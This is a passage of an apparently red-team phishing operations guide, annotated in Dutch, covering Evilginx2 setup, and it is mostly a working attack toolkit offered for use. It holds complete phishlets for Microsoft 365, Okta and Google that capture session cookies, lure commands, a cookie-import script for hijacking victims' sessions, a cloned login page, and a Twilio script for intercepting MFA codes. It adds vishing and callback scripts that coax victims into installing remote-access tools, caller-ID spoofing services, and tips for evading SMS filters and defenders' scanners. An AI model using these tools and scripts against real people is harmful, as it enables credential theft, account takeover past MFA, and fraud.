3 Email Deliverability Testing

```bash
#!/bin/bash
# test_email_deliverability.sh

DOMAIN="yourdomain.com"

echo "=== EMAIL DELIVERABILITY CHECKLIST ==="
echo ""

# 1. Check SPF
echo "[*] Checking SPF..."
dig +short TXT ${DOMAIN} | grep "v=spf1"

# 2. Check DKIM
echo "[*] Checking DKIM..."
dig +short TXT default._domainkey.${DOMAIN}

# 3. Check DMARC
echo "[*] Checking DMARC..."
dig +short TXT _dmarc.${DOMAIN}

# 4. Check MX
echo "[*] Checking MX..."
dig +short MX ${DOMAIN}

# 5. Check PTR (Reverse DNS)
echo "[*] Checking PTR..."
SERVER_IP=$(dig +short ${DOMAIN})
dig +short -x ${SERVER_IP}

# 6. Check blacklists
echo "[*] Checking blacklists..."
echo "Manual check at: https://mxtoolbox.com/blacklists.aspx"

echo ""
echo "=== SEND TEST EMAILS TO ==="
echo "• mail-tester.com (score check)"
echo "• Personal Gmail account"
echo "• Personal Outlook account"
```

> **📘 UITLEG:**
> **Test email deliverability VOOR engagement:**
>
> 1. **mail-tester.com:** Geeft score 1-10
> 2. **Gmail test:** Check of het in inbox komt
> 3. **Outlook test:** Microsoft is strenger
>
> **Doel score:** 8+/10 op mail-tester

---

# 4. EVILGINX2 COMPLETE SETUP

## 4.1 Installation

```bash
#!/bin/bash
# evilginx2_install.sh

# Prerequisites
apt update
apt install -y git make golang-go

# Set Go environment
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc

# Clone and build Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Create directories
mkdir -p /opt/evilginx
cp -r build/* /opt/evilginx/
cd /opt/evilginx

# Stop any service using port 80/443
systemctl stop apache2 2>/dev/null
systemctl stop nginx 2>/dev/null

echo "[+] Evilginx2 installed in /opt/evilginx"
echo "[*] Run with: /opt/evilginx/evilginx"
```

> **📘 UITLEG:**
> **Evilginx2 is een man-in-the-middle phishing framework:**
> - Proxyt echte website
> - Vangt credentials EN session cookies
> - Bypassed MFA volledig
> - Victim ziet echte site (na inlog)

---

## 4.2 Initial Configuration

```bash
# Start Evilginx
cd /opt/evilginx
./evilginx

# In Evilginx console:

# 1. Set domain
config domain yourdomain.com

# 2. Set server IP (public IP van server)
config ip YOUR_PUBLIC_IP

# 3. Configure DNS (extern - bij registrar)
# Evilginx genereert benodigde subdomains
# Je moet deze toevoegen aan je DNS:
# A record: @ → YOUR_IP
# A record: www → YOUR_IP

# 4. Enable/Configure phishlet
phishlets hostname microsoft365 login.yourdomain.com

# 5. Enable phishlet
phishlets enable microsoft365

# 6. Get SSL certificate (automatic via Let's Encrypt)
# Evilginx handles this when you enable the phishlet
```

> **📘 UITLEG:**
> **Evilginx configuratie flow:**
> 1. Set je domein en IP
> 2. Kies phishlet (o365, okta, google, etc.)
> 3. Map hostname naar subdomain
> 4. Enable = get SSL cert automatisch

---

## 4.3 Complete Phishlets

### Microsoft 365 Phishlet

```yaml
# microsoft365.yaml - Save in /opt/evilginx/phishlets/

name: 'Microsoft 365'
author: 'XPOSE Security'
min_ver: '2.4.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
  - domain: '.microsoftonline.com'
    keys: ['SignInStateCookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/authorize'
```

> **📘 UITLEG:**
> **Microsoft 365 phishlet breakdown:**
>
> **proxy_hosts:** Welke Microsoft domeinen te proxyen
> - `login.microsoftonline.com` = login pagina
> - `office.com` = Office portal
> - `msftauth.net` = Auth CDN
>
> **auth_tokens:** Cookies om te stelen
> - `ESTSAUTH` = Sessie token
> - `ESTSAUTHPERSISTENT` = Persistent login
>
> **credentials:** Waar username/password staan in POST

---

### Okta Phishlet (Scattered Spider Favorite)

```yaml
# okta.yaml

name: 'Okta'
author: 'XPOSE Security'
min_ver: '2.4.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '{okta_org}', domain: 'okta.com', session: true, is_landing: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'okta.com', session: false, is_landing: false}
  - {phish_sub: 'oktacdn', orig_sub: 'oktacdn', domain: 'com', session: false, is_landing: false}

sub_filters:
  - {triggers_on: '{okta_org}.okta.com', orig_sub: '{okta_org}', domain: 'okta.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.{okta_org}.okta.com'
    keys: ['sid', 'DT', 'oktaStateToken', 'JSESSIONID']
  - domain: '.okta.com'
    keys: ['idx']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: '{okta_org}.okta.com'
  path: '/login/login.htm'

# Custom parameter - set when enabling
# phishlets hostname okta target-company
# This sets {okta_org} = target-company
```

> **📘 UITLEG:**
> **Okta phishlet vereist customization:**
>
> Bij enablen:
> ```
> phishlets hostname okta targetcompany.yourdomain.com
> ```
>
> De `{okta_org}` placeholder wordt vervangen met de target's Okta subdomain.

---

### Google Workspace Phishlet

```yaml
# google.yaml

name: 'Google Workspace'
author: 'XPOSE Security'
min_ver: '2.4.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'SSID', 'HSID', 'LSID', 'APISID', 'SAPISID', 'NID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier'
```

> **📘 UITLEG:**
> **Google heeft veel sessie cookies:**
> - `SID`, `SSID`, `HSID` = Core session
> - `__Secure-*` = Secure cookies
> - Alle nodig voor complete session hijack

---

## 4.4 Lure Creation & Management

```bash
# In Evilginx console:

# Create a lure for Microsoft 365
lures create microsoft365

# Customize the lure
lures edit 0 redirect_url https://outlook.office365.com/mail/
lures edit 0 info "IT Password Reset Campaign"

# Get the phishing URL
lures get-url 0

# Output example:
# https://login.yourdomain.com/aBcDeFgH

# === ADVANCED LURE OPTIONS ===

# Set custom path
lures edit 0 path /password-reset

# Set user agent filter (only allow certain browsers)
lures edit 0 ua_filter "Mozilla/5.0.*Windows NT"

# Enable OTP token capturing
lures edit 0 og_title "Sign in to your account"
lures edit 0 og_desc "Please sign in to continue"
lures edit 0 og_image "https://yourdomain.com/logo.png"

# Pause lure (temporarily disable)
lures pause 0

# Resume lure
lures unpause 0
```

> **📘 UITLEG:**
> **Lure customization options:**
>
> **redirect_url:** Waar victim naartoe gaat na succesvolle capture
> **path:** Custom URL path (ipv random string)
> **ua_filter:** Block security scanners
> **og_*:** OpenGraph tags voor link previews

---

## 4.5 Session Hijacking

```bash
# Monitor for captured sessions
sessions

# Output:
# +-+------------+---------------+-----------------+------------+
# | | id         | phishlet      | username        | password   |
# +-+------------+---------------+-----------------+------------+
# | | 1          | microsoft365  | user@target.com | ********   |
# +-+------------+---------------+-----------------+------------+

# View session details
sessions 1

# Export session cookies
sessions 1 export

# Output: JSON with all captured cookies
```

### Cookie Import Script

```javascript
// cookie_import.js - Run in browser console
// Import captured Evilginx session

function importCookies(cookieData) {
    // cookieData = JSON output from "sessions X export"
    const cookies = JSON.parse(cookieData);
    
    cookies.forEach(cookie => {
        document.cookie = `${cookie.name}=${cookie.value}; domain=${cookie.domain}; path=${cookie.path}; ${cookie.secure ? 'secure;' : ''} ${cookie.httpOnly ? '' : ''}`;
    });
    
    console.log('[+] Cookies imported. Refresh the page.');
}

// Usage:
// 1. Go to login.microsoftonline.com
// 2. Open developer console (F12)
// 3. Paste this script
// 4. Run: importCookies('{"name":"ESTSAUTH","value":"..."}')
// 5. Refresh page - should be logged in as victim
```

> **📘 UITLEG:**
> **Session hijacking workflow:**
>
> 1. Victim klikt phishing link
> 2. Victim logt in (MFA en al)
> 3. Evilginx vangt session cookies
> 4. Export cookies
> 5. Import in browser
> 6. Je bent ingelogd als victim!
>
> **MFA is volledig omzeild:** Je hebt de POST-MFA sessie.

---

# 5. LANDING PAGE DEVELOPMENT

## 5.1 Clone Existing Pages

```bash
# HTTrack - Clone websites
apt install httrack

# Clone Microsoft login
httrack "https://login.microsoftonline.com" \
    -O /var/www/phishing/microsoft \
    -v \
    --depth=2 \
    --ext-depth=1 \
    -N0

# Clone Okta login
httrack "https://targetcompany.okta.com" \
    -O /var/www/phishing/okta \
    -v \
    --depth=2

# Note: Voor credential harvesting met Evilginx
# is cloning niet nodig - Evilginx proxyt de echte site
```

> **📘 UITLEG:**
> **Wanneer clonen:**
> - Eenvoudige credential capture (geen MFA bypass)
> - Standalone landing pages
> - Training/demo purposes
>
> **Wanneer Evilginx:**
> - MFA bypass nodig
> - Session hijacking nodig
> - Real-time proxy preferred

---

## 5.2 Custom Phishing Page Template

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img { height: 40px; }
        h1 {
            font-size: 24px;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        p.subtitle {
            color: #666;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #333;
            font-size: 14px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover { background: #5a6fd6; }
        .error {
            background: #fee;
            color: #c00;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
        }
        .links {
            margin-top: 24px;
            text-align: center;
        }
        .links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <!-- Replace with target company logo -->
            <img src="logo.png" alt="Company Logo">
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">Use your company account</p>
        
        <div class="error" id="error">
            Invalid credentials. Please try again.
        </div>
        
        <form id="loginForm" action="/capture" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required 
                       placeholder="user@company.com">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required
                       placeholder="Enter your password">
            </div>
            
            <button type="submit">Sign in</button>
        </form>
        
        <div class="links">
            <a href="#">Forgot password?</a> · 
            <a href="#">Need help?</a>
        </div>
    </div>

    <script>
        // Optional: Add realistic loading behavior
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = this.querySelector('button');
            btn.textContent = 'Signing in...';
            btn.disabled = true;
        });
    </script>
</body>
</html>
```

> **📘 UITLEG:**
> **Custom landing page tips:**
> - Match corporate branding
> - Professional design
> - Mobile responsive
> - Realistic error messages
> - Loading states voor realisme

---

# 6. VISHING OPERATIONS

## 6.1 Vishing Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         VISHING ATTACK FLOW                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐             │
│  │  PRETEXT │───►│   CALL   │───►│ EXTRACT  │───►│  ACCESS  │             │
│  │          │    │          │    │   INFO   │    │          │             │
│  │ Script   │    │ Build    │    │ Creds    │    │ Use info │             │
│  │ prepared │    │ rapport  │    │ OTP      │    │ to login │             │
│  │          │    │          │    │ Actions  │    │          │             │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 UITLEG:**
> **Vishing = Voice Phishing**
> - Telefonisch social engineering
> - Zeer effectief voor MFA bypass
> - Scattered Spider's primaire techniek
> - Vereist goede pretexts en voice skills

---

## 6.2 Infrastructure Setup

### Phone Number Acquisition

```yaml
VoIP Providers (Anoniem):
  MySudo:
    Platforms: iOS, Android
    Privacy: No ID verification
    Features: Multiple phone numbers
    Cost: $0.99-14.99/month
    
  Hushed:
    Platforms: iOS, Android
    Privacy: Prepaid, no ID
    Features: Disposable numbers
    Cost: Pay-as-you-go
    
  TextNow:
    Platforms: iOS, Android, Web
    Privacy: Free tier available
    Features: US/Canada numbers
    
Professional VoIP (Business):
  Twilio:
    Features: Programmable voice
    Cost: Pay per minute
    Use: Automated calls
    
  RingCentral:
    Features: Business phone system
    Use: Professional appearance
    
Caller ID Spoofing:
  SpoofCard:
    Features: Spoof outbound caller ID
    Cost: Credits-based
    Legal: Check local laws!
    
  Burner App:
    Features: Temporary numbers
    Cost: In-app purchases
```

> **📘 UITLEG:**
> **Number selection strategy:**
> - Local area code van target = hogere answer rate
> - Business hours = corporate pretext
> - Spoofed IT helpdesk number = highest trust

---

## 6.3 Vishing Scripts

### IT Helpdesk Pretext

```markdown
# VISHING SCRIPT: IT HELPDESK MFA RESET

## Opening
"Hi, this is [NAME] from IT Support. I'm calling about a security alert
we received for your account. Is this [TARGET NAME]?"

[Wait for confirmation]

## Build Urgency
"We detected unusual login activity on your account from an IP address
in [FOREIGN COUNTRY]. For your protection, we've temporarily locked
your account. I'm calling to help you verify your identity and restore
access."

## Extract Information
"First, I need to verify I'm speaking with the right person. Can you
confirm the email address associated with your corporate account?"

[Target provides email]

"Thank you. Now, for security verification, I'm going to send a 
verification code to your phone. Can you read it back to me once 
you receive it?"

[Trigger MFA push or SMS]
[Target reads OTP]

## Alternative: Password Reset
"I see here that your password was compromised in this breach. 
I need to help you reset it right now. What password would you 
like to use?"

[Target provides new password - or you set it]

## Closing
"Perfect, your account is now secured. You should be able to log in
normally. If you have any issues, call our helpdesk at [REAL NUMBER].
Have a great day."

## Notes:
- Stay calm and professional
- Use corporate terminology
- Mirror their communication style
- Don't rush - build trust first
```

> **📘 UITLEG:**
> **Script elements:**
> - **Opening:** Establish identity and purpose
> - **Urgency:** Create need for immediate action
> - **Verification:** Seem legitimate by "verifying" them
> - **Extraction:** Get what you need
> - **Closing:** Seem helpful, leave no suspicion

---

### Callback Phishing (BazarCall)

```markdown
# VISHING SCRIPT: CALLBACK PHISHING

## Context
Victim received phishing email with "subscription" or "invoice"
They call the number to "cancel" the fake subscription

## Greeting
"Thank you for calling [FAKE COMPANY] support. How can I help you today?"

[Victim explains about unwanted subscription/charge]

## Sympathy + Solution
"I completely understand your concern. Let me look into this for you.
Can I get your name and email address to look up the account?"

[Collect information]

"I see the issue. It looks like there was an error in our system. 
I can cancel this right away and process a refund. But first, I need 
to verify your identity and update our records."

## Remote Access (FIN7 Style)
"To cancel this subscription and confirm the refund, I need to verify
your computer information. Can you go to [WEBSITE] and download our
verification tool? It will generate a code I need."

[Guide victim to download remote access tool like AnyDesk]

"Once it's open, can you give me the connection code on your screen?"

[Connect to victim's computer]

## Alternative: Credential Harvest
"To process the refund, I need to verify your identity. Can you log into
your bank account while I'm on the phone to confirm the refund went through?"

[Watch them type credentials via remote access]

## Closing
"The refund has been processed and the subscription is cancelled. 
You'll see the credit in 3-5 business days. Is there anything else 
I can help with today?"
```

> **📘 UITLEG:**
> **BazarCall/Callback phishing:**
> - Victim calls YOU (more trust)
> - They want to solve a "problem"
> - You "help" them by:
>   - Installing remote access
>   - Providing credentials
>   - Authorizing actions
>
> **Very effective:** Victim initiated contact

---

## 6.4 Vishing Tips & Techniques

```yaml
Psychological Techniques:
  Authority:
    - Claim to be from IT, Security, HR, or Management
    - Reference real people (from LinkedIn research)
    - Use corporate terminology
    
  Urgency:
    - "Your account will be locked in 30 minutes"
    - "We need to resolve this before end of business"
    - "The security team is waiting on this"
    
  Reciprocity:
    - "I'm here to help you"
    - "Let me solve this problem for you"
    - Offer assistance before asking for anything
    
  Social Proof:
    - "Several employees have been affected"
    - "We're going through all accounts today"
    - "Your colleague just went through this"

Voice Techniques:
  Tone:
    - Calm and professional
    - Slightly rushed (shows you're busy = legitimate)
    - Friendly but businesslike
    
  Pacing:
    - Match the target's pace
    - Slow down for important requests
    - Speed up during routine parts
    
  Filler Words:
    - Use natural speech patterns
    - "Um", "let me see", "one moment"
    - Sounds more human, less scripted

Handling Objections:
  "I need to verify this with my manager":
    Response: "Of course, I understand. Just so you know, your 
    account will remain locked until we complete this. I'll be 
    here when you're ready."
    
  "Can you call me back on the official number?":
    Response: "Absolutely. The ticket number is [FAKE#]. They'll 
    transfer you back to me since I'm handling this case."
    
  "How do I know you're really from IT?":
    Response: "Great security awareness! You can verify by checking 
    your email - I just sent you a verification message from 
    IT-support@company.com" [Send phishing email simultaneously]
```

> **📘 UITLEG:**
> **Handling resistance:**
> - Never get defensive
> - Praise their security awareness
> - Provide "verification" that you control
> - Always have a backup plan

---

# 7. SMISHING OPERATIONS

## 7.1 SMiShing Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SMISHING ATTACK TYPES                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  TYPE 1: CREDENTIAL HARVEST                                                 │
│  SMS: "Your account has been compromised. Verify at: bit.ly/xyz"           │
│  ──────────────────────────────────────────────────────────────            │
│                                                                             │
│  TYPE 2: MFA INTERCEPT                                                      │
│  SMS: "IT Support: Reply with the code you just received to verify"        │
│  [Attacker triggers real MFA, victim forwards code]                        │
│  ──────────────────────────────────────────────────────────────            │
│                                                                             │
│  TYPE 3: CALLBACK PHISHING                                                  │
│  SMS: "Urgent: Call IT immediately at [ATTACKER NUMBER] re: breach"        │
│  ──────────────────────────────────────────────────────────────            │
│                                                                             │
│  TYPE 4: MALWARE DELIVERY                                                   │
│  SMS: "Your package is ready. Track: [MALICIOUS LINK]"                     │
│  ──────────────────────────────────────────────────────────────            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 UITLEG:**
> **SMiShing = SMS Phishing**
> - Korte, urgente berichten
> - Hogere open rate dan email
> - Moeilijker te filteren door security tools
> - Persoonlijker (mobile = personal device)

---

## 7.2 SMS Sending Infrastructure

```yaml
SMS Providers:

Bulk SMS (Business accounts):
  Twilio:
    URL: twilio.com
    Features: API, programmable SMS
    Cost: ~$0.0075/SMS
    Pros: Reliable, good API
    Cons: Strict verification
    
  MessageBird:
    URL: messagebird.com
    Features: Global SMS, Voice
    Cost: Pay as you go
    Pros: European friendly
    
  Plivo:
    URL: plivo.com
    Features: Similar to Twilio
    Cost: Competitive pricing

Anonymous SMS:
  TextNow:
    Features: Free SMS from app
    Limit: Rate limited
    
  TextFree:
    Features: Free texting
    
  Various Web SMS:
    - sendsms.com
    - textem.net
    - Carrier dependent

SIM Farms (Advanced):
  Hardware: Multiple USB modems + SIM cards
  Software: Gammu, SMS Server Tools
  Pros: Full anonymity
  Cons: Complex setup
```

---

## 7.3 SMiShing Scripts

### MFA Interception

```python
#!/usr/bin/env python3
"""
smishing_mfa_intercept.py
Coordinate SMiShing with real-time MFA capture
"""

import requests
from twilio.rest import Client
import time

# Twilio config
TWILIO_SID = "your_sid"
TWILIO_AUTH = "your_auth"
TWILIO_NUMBER = "+1234567890"

# Target
TARGET_NUMBER = "+1987654321"
TARGET_EMAIL = "victim@target.com"

def send_sms(to_number: str, message: str) -> bool:
    """Send SMS via Twilio"""
    client = Client(TWILIO_SID, TWILIO_AUTH)
    
    msg = client.messages.create(
        body=message,
        from_=TWILIO_NUMBER,
        to=to_number
    )
    
    return msg.sid is not None

def trigger_mfa():
    """Trigger MFA push/SMS for target account"""
    # This would be your mechanism to trigger an MFA prompt
    # Could be a login attempt, password reset, etc.
    pass

def main():
    # Step 1: Send warning SMS
    warning_msg = (
        "[COMPANY IT] Security Alert: Unusual activity detected on your account. "
        "You will receive a verification code shortly. "
        "Reply with the code to verify your identity."
    )
    
    print("[*] Sending initial warning SMS...")
    send_sms(TARGET_NUMBER, warning_msg)
    
    # Step 2: Wait a moment
    time.sleep(5)
    
    # Step 3: Trigger real MFA
    print("[*] Triggering MFA...")
    trigger_mfa()
    
    # Step 4: Wait for victim to forward code
    print("[*] Waiting for victim response...")
    # In real scenario: poll for incoming SMS or have callback
    
    # Step 5: Victim replies with code
    # Use code within validity window (usually 30-60 seconds)

if __name__ == "__main__":
    main()
```

> **📘 UITLEG:**
> **MFA Interception flow:**
> 1. Send SMS claiming security issue
> 2. Tell victim to expect a code
> 3. Trigger REAL MFA for victim's account
> 4. Victim receives real code, thinks it's verification
> 5. Victim forwards code to you
> 6. Use code before expiration

---

### SMiShing Message Templates

```yaml
Corporate IT Pretexts:
  - "[COMPANY] IT: Your password expires today. Reset now: [LINK]"
  - "[COMPANY] Security: Suspicious login blocked. Verify: [LINK]"
  - "[COMPANY] HR: Benefit enrollment closes today. Update: [LINK]"

Personal Pretexts:
  - "Your package couldn't be delivered. Reschedule: [LINK]"
  - "Your bank account has been locked. Verify: [LINK]"
  - "You have a new voicemail. Listen: [LINK]"

Callback Pretexts:
  - "[COMPANY] IT: URGENT - Call [NUMBER] regarding account breach"
  - "Your subscription will renew for $499.99. Call to cancel: [NUMBER]"
  - "Fraud alert: Call [NUMBER] to verify recent transaction"

MFA Intercept:
  - "[COMPANY] Security: Reply with the code you receive to verify identity"
  - "IT Support: An OTP was sent to verify account recovery. Forward here."
```

> **📘 UITLEG:**
> **Effective SMiShing:**
> - Kort en urgent
> - Lijkt op legitieme notificaties
> - Call-to-action is duidelijk
> - Timing is cruciaal (werk uren)

---

## 7.4 SMS Filters & Bypass

```yaml
Carrier Filters Bypass:
  Avoid Trigger Words:
    Bad: "Click here", "Free", "Winner", "Act now"
    Better: Natural language, no hard sells
    
  Link Shortening:
    - Branded shortlinks (Bitly branded domain)
    - Look-alike domains
    - Avoid bit.ly (often blocked)
    
  Number Rotation:
    - Use multiple sender numbers
    - Rotate numbers between batches
    - Different number per target
    
  Message Variation:
    - Slight variations in each message
    - Avoid identical mass texts
    - Personalize where possible

Enterprise Filters Bypass:
  MDM Solutions:
    - Test against target's MDM if known
    - Some MDM's filter SMS links
    
  Timing:
    - After hours: Less monitoring
    - Weekends: Personal device focus
    
  Content:
    - Match corporate communication style
    - Reference real internal projects/events
```

---

# 8. CAMPAIGN MANAGEMENT

## 8.1 Campaign Planning Checklist

```markdown
# PHISHING CAMPAIGN CHECKLIST

## Pre-Campaign (2-4 weeks before)
☐ Scope and authorization confirmed in ROE
☐ Target list compiled and verified
☐ Pretext developed and approved
☐ Domains registered and aging
☐ Email infrastructure tested
☐ Landing pages/Evilginx configured
☐ Test emails sent to personal accounts
☐ Deliverability score > 8/10

## Launch Day
☐ Infrastructure final checks
☐ Monitoring setup (logs, alerts)
☐ Backup plans documented
☐ Emergency contacts ready
☐ First batch sent (10% of targets)
☐ Monitor for issues (1 hour)
☐ Full send if no problems

## During Campaign
☐ Monitor click rates
☐ Monitor credential captures
☐ Watch for detection/blocking
☐ Document all captures
☐ Ready to pivot if blocked

## Post-Campaign
☐ Export all results
☐ Remove persistence (if any)
☐ Disable infrastructure
☐ Draft results summary
☐ Prepare for debrief
```

---

## 8.2 Metrics & Reporting

```yaml
Email Metrics:
  Delivery Rate: Emails delivered / Emails sent
  Open Rate: Emails opened / Emails delivered
  Click Rate: Clicks / Emails delivered
  Credential Capture Rate: Credentials / Clicks
  MFA Bypass Rate: Sessions captured / Credentials

Vishing Metrics:
  Answer Rate: Calls answered / Calls made
  Engagement Rate: Engaged conversation / Calls answered
  Success Rate: Info extracted / Engaged conversations
  Hang-up Rate: Quick hang-ups / Calls answered

SMiShing Metrics:
  Delivery Rate: SMS delivered / SMS sent
  Response Rate: Responses / SMS delivered
  Click Rate: Link clicks / SMS delivered
  Conversion Rate: Actions taken / Clicks

Benchmark Goals:
  Email Click Rate: 10-30% is typical
  Credential Capture: 30-70% of clickers
  Vishing Success: 20-40% of answered calls
  SMS Click Rate: 15-40% (higher than email)
```

> **📘 UITLEG:**
> **Metrics helpen:**
> - ROI van security awareness aantonen
> - Verbeterpunten identificeren
> - Volgende campaigns optimaliseren
> - Board-level reporting

---

# 9. OPSEC & DETECTION AVOIDANCE

## 9.1 Anti-Detection Measures

```yaml
Email OPSEC:
  Header Sanitization:
    - Remove X-Originating-IP
    - Remove X-Mailer
    - Spoof received headers
    
  Content:
    - No known phishing keywords
    - Unique content per batch
    - HTML obfuscation where needed
    
  Sending Patterns:
    - Spread sends over hours
    - Random delays between emails
    - Multiple sender addresses

Web OPSEC:
  Redirectors:
    - Never expose C2/Evilginx IP directly
    - Use CDN (Cloudflare) for protection
    - Implement access controls
    
  Access Controls:
    - Block known security vendor IPs
    - Block Tor exit nodes
    - Geo-restrict if appropriate
    - User-Agent filtering
    
  Decoy Pages:
    - Show fake 404 to scanners
    - Serve decoy content to non-targets

Phone OPSEC:
  Caller ID:
    - Spoof legitimate numbers carefully
    - Use local area codes
    - Rotate numbers
    
  Voice:
    - Background noise (office sounds)
    - No identifiable accents
    - Professional demeanor
```

---

## 9.2 Phishing Detection by Defenders

```yaml
What Defenders Look For:
  Email Analysis:
    - New/unknown sender domains
    - SPF/DKIM/DMARC failures
    - Suspicious links
    - Urgency language
    - Typos and poor grammar
    
  URL Analysis:
    - Recently registered domains
    - Uncategorized domains
    - Look-alike domains
    - URL shorteners
    - Suspicious TLDs
    
  Behavioral:
    - Mass clicks from organization
    - Unusual login patterns
    - New device registrations
    
How To Counter:
  - Age domains (30+ days)
  - Proper SPF/DKIM/DMARC
  - Professional content
  - Targeted, not mass
  - Categorize domains properly
  - Use legitimate-looking infrastructure
```

---

# 10. POST-CAMPAIGN PROCEDURES

## 10.1 Campaign Shutdown

```bash
# 1. Disable all lures
evilginx> lures pause all

# 2. Export captured data
evilginx> sessions export all

# 3. Stop services
systemctl stop evilginx
systemctl stop postfix

# 4. Backup logs
tar -czvf phishing_campaign_$(date +%Y%m%d).tar.gz /var/log/evilginx/ /var/log/mail/

# 5. Securely store credentials
# Encrypt captured data
gpg -c captured_credentials.json

# 6. Destroy infrastructure (after report)
# terraform destroy
# or
# Delete VPS from provider dashboard

# 7. Release domains (optional)
# Or park for future use
```

## 10.2 Reporting Summary

```markdown
# PHISHING CAMPAIGN SUMMARY

## Campaign: [NAME]
Date: [START] - [END]
Type: Email Phishing + Vishing

## Results Summary
| Metric | Email | Vishing | SMiShing |
|--------|-------|---------|----------|
| Targets | 200 | 50 | 100 |
| Delivered | 195 | 45 | 98 |
| Engaged | 82 (42%) | 20 (44%) | 35 (36%) |
| Captured | 45 (23%) | 15 (33%) | 12 (12%) |

## Notable Findings
- 45 credentials captured via email phishing
- 15 MFA codes obtained via vishing
- 3 executives fell for phishing
- IT Helpdesk pretext most effective
- Detection: Email blocked after 3 hours (SEG signature)

## Recommendations
1. Security Awareness Training (all staff)
2. Implement MFA that doesn't use SMS
3. Helpdesk caller verification procedures
4. Domain monitoring for typosquats
```

---

**EINDE PHISHING INFRASTRUCTURE GUIDE**

---

*Dit document bevat gevoelige social engineering technieken.*
*Alleen voor geautoriseerde XPOSE Security engagements.*

